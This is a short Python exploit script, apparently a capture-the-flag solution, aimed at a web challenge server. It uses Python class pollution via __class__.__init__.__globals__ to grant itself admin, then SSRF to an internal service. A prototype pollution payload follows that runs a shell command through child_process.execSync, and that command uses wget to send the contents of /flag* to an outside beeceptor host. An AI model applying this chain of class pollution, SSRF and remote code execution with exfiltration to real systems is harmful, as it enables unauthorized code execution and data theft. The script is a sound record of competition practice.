import requests
import base64
import random

s = requests.Session()
URL = 'https://osen-v40xwj8zbuuj3ajk.boita.tech'
# URL = 'http://localhost:5000'

"""
/api/register
/api/update_user
/api/user/me
/api/check_url
"""


username = base64.b64encode(random.randbytes(16))

r = s.post(URL + '/api/register', json={
    'name': 'maluquinho',
    'username':username,
    'age': 150
    })

print(r.content.decode())
session_id = r.cookies.get("session_id")
#session_id = '5505a2cc-47d1-42a9-b7f9-beba157004aa'


# print(r.content.decode())
#
# r = s.get(URL + '/api/user/me')
#
# print(r.content.decode())


ssrf_url = f'http://127.0.0.1:3000/api/submit_players'
r = s.post(URL + '/api/update_user', json={
    'name': 'maluquinho',
    'username': username,
    'age': 150,
    'role': 'admin',
    'url': ssrf_url,
    '__class__': {
        '__init__': {
            '__globals__': {
                'USERS': [{
                    'name': 'maluquinho',
                    'username': username,
                    'age': 150,
                    'role': 'admin',
                    'url': ssrf_url,
                    'session_id': session_id
                    }]
                }
            }
        }
    })

r = s.post(URL + '/api/check_url', json={
    'url': ssrf_url,
    'method': 'post',
    'headers': {},
    'data': {
        "__proto__": {
            "block": {
                "type":"Text",
                "line":"console.log(process.mainModule.require('child_process').execSync('wget https://aisodjoaij.free.beeceptor.com/?q=$(cat /flag*)').toString())"
            },
         },
        'player1': ['vsm'],
        'player2': ['gankd'],
        'player3': ['zetsu']
        }
    })

print(r.content.decode())

